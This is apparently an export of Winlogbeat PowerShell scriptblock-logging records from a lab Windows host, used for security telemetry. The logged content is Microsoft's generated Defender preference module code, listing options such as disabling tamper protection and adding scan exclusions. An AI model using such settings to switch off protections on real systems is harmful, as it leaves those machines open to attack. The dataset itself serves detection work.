    ${DisableDnsOverTcpParsing},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dsshp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableSshParsing},

    [Parameter(ParameterSetName='Set0')]
    [Alias('puc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('NotConfigured','Beta','Preview','Staged','Broad','Delayed')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType]
    ${PlatformUpdatesChannel},

    [Parameter(ParameterSetName='Set0')]
    [Alias('euc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('NotConfigured','Beta','Preview','Staged','Broad','Delayed')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType]
    ${EngineUpdatesChannel},

    [Parameter(ParameterSetName='Set0')]
    [Alias('duc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('NotConfigured','Staged','Broad','Delayed')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType]
    ${DefinitionUpdatesChannel},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dgr')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableGradualRelease},

    [Parameter(ParameterSetName='Set0')]
    [Alias('anpdl')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${AllowNetworkProtectionDownLevel},

    [Parameter(ParameterSetName='Set0')]
    [Alias('adpows')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${AllowDatagramProcessingOnWinServer},

    [Parameter(ParameterSetName='Set0')]
    [Alias('ednss')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${EnableDnsSinkhole},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dicf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableInboundConnectionFiltering},

    [Parameter(ParameterSetName='Set0')]
    [Alias('drdpp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableRdpParsing},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dnppt')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableNetworkProtectionPerfTelemetry},

    [Parameter(ParameterSetName='Set0')]
    [Alias('tlps')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${TrustLabelProtectionStatus},

    [Parameter(ParameterSetName='Set0')]
    [Alias('astai')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${AllowSwitchToAsyncInspection},

    [Parameter(ParameterSetName='Set0')]
    [Alias('scso')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${ScanScheduleOffset},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dtdtf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableTDTFeature},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dtp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableTamperProtection},

    [Parameter(ParameterSetName='Set0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Set0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Set0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionPath')) {
          [object]$__cmdletization_value = ${ExclusionPath}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {
          [object]$__cmdletization_value = ${ExclusionExtension}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {
          [object]$__cmdletization_value = ${ExclusionProcess}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionIpAddress')) {
          [object]$__cmdletization_value = ${ExclusionIpAddress}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RealTimeScanDirection')) {
          [object]$__cmdletization_value = ${RealTimeScanDirection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'Microsoft.PowerShell.Cmdlet

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc","[ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]
    ${HighThreatDefaultAction},

    [Parameter(ParameterSetName='Set0')]
    [Alias('stdefac')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]
    ${SevereThreatDefaultAction},

    [Parameter(ParameterSetName='Set0')]
    [switch]
    ${Force},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dbaf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableBlockAtFirstSeen},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Disabled','Enabled','AuditMode')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType]
    ${PUAProtection},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Default','Moderate','High','HighPlus','ZeroTolerance')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType]
    ${CloudBlockLevel},

    [Parameter(ParameterSetName='Set0')]
    [Alias('cloudextimeout')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${CloudExtendedTimeout},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Disabled','Enabled','AuditMode')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType]
    ${EnableNetworkProtection},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Disabled','Enabled','AuditMode','BlockDiskModificationOnly','AuditDiskModificationOnly')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType]
    ${EnableControlledFolderAccess},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${AttackSurfaceReductionOnlyExclusions},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ControlledFolderAccessAllowedApplications},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ControlledFolderAccessProtectedFolders},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${AttackSurfaceReductionRules_Ids},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]]
    ${AttackSurfaceReductionRules_Actions},

    [Parameter(ParameterSetName='Set0')]
    [Alias('elcp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${EnableLowCpuPriority},

    [Parameter(ParameterSetName='Set0')]
    [Alias('efhc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${EnableFileHashComputation},

    [Parameter(ParameterSetName='Set0')]
    [Alias('efsobp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${EnableFullScanOnBatteryPower},

    [Parameter(ParameterSetName='Set0')]
    [Alias('ppurl')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string]
    ${ProxyPacUrl},

    [Parameter(ParameterSetName='Set0')]
    [Alias('proxsrv')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string]
    ${ProxyServer},

    [Parameter(ParameterSetName='Set0')]
    [Alias('proxbps')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ProxyBypass},

    [Parameter(ParameterSetName='Set0')]
    [Alias('fupo')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${ForceUseProxyOnly},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dtlsp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableTlsParsing},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dhttpp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableHttpParsing},

    [Parameter(ParameterSetName='Set0')]
    [Alias('ddnsp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableDnsParsing},

    [Parameter(ParameterSetName='Set0')]
    [Alias('ddnstcpp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableDnsOverTcpParsing},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dsshp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableSshParsing},

    [Parameter(ParameterSetName='Set0')]
    [Alias('puc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('NotConfigured','Beta','Preview','Staged','Broad','Delayed')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType]
    ${PlatformUpdatesChannel},

    [Parameter(ParameterSetName='Set0')]
    [Alias('euc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('NotConfigured','Beta','Preview','Staged','Broad','Delayed')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType]
    ${EngineUpdatesChannel},

    [Parameter(ParameterSetName='Set0')]
    [Alias('duc')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('NotConfigured','Staged','Broad','Delayed')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType]
    ${DefinitionUpdatesChannel},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dgr')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableGradualRelease},

    [Parameter(ParameterSetName='Set0')]
    [Alias('anpdl')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${AllowNetworkProtectionDownLevel},

    [Parameter(ParameterSetName='Set0')]
    [Alias('adpows')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${AllowDatagramProcessingOnWinServer},

    [Parameter(ParameterSetName='Set0')]
    [Alias('ednss')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${EnableDnsSinkhole},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dicf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableInboundConnectionFiltering},

    [Parameter(ParameterSetName='Set0')]
    [Alias('drdpp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableRdpParsing},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dnppt')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableNetworkProtectionPerfTelemetry},

    [Parameter(ParameterSetName='Set0')]
    [Alias('tlps')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${TrustLabelProtectionStatus},

    [Parameter(ParameterSetName='Set0')]
    [Alias('astai')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${AllowSwitchToAsyncInspection},

    [Parameter(ParameterSetName='Set0')]
    [Alias('scso')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${ScanScheduleOffset},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dtdtf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableTDTFeature},

    [Parameter(ParameterSetName='Set0')]
    [Alias('dtp')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${DisableTamperProtection},

    [Parameter(ParameterSetName='Set0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Set0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Set0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionPath')) {
          [object]$__cmdletization_value = ${ExclusionPath}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {
          [object]$__cmdletization_value = ${ExclusionExtension}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {
          [object]$__cmdletization_value = ${ExclusionProcess}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ExclusionIpAddress')) {
          [object]$__cmdletization_value = ${ExclusionIpAddress}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RealTimeScanDirection')) {
          [object]$__cmdletization_value = ${RealTimeScanDirection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'Microsoft.PowerShell.Cmdlet",2,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3331,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",YXkSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.202",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (3 of 20):
ization.GeneratedTypes.MpPreference.ScanDirection'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanDirection'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('QuarantinePurgeItemsAfterDelay')) {
          [object]$__cmdletization_value = ${QuarantinePurgeItemsAfterDelay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemediationScheduleDay')) {
          [object]$__cmdletization_value = ${RemediationScheduleDay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemediationScheduleTime')) {
          [object]$__cmdletization_value = ${RemediationScheduleTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ReportingAdditionalActionTimeOut')) {
          [object]$__cmdletization_value = ${ReportingAdditionalActionTimeOut}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ReportingCriticalFailureTimeOut')) {
          [object]$__cmdletization_value = ${ReportingCriticalFailureTimeOut}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ReportingNonCriticalTimeOut')) {
          [object]$__cmdletization_value = ${ReportingNonCriticalTimeOut}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ServiceHealthReportInterval')) {
          [object]$__cmdletization_value = ${ServiceHealthReportInterval}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceHealthReportInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceHealthReportInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ReportDynamicSignatureDroppedEvent')) {
          [object]$__cmdletization_value = ${ReportDynamicSignatureDroppedEvent}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportDynamicSignatureDroppedEvent'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
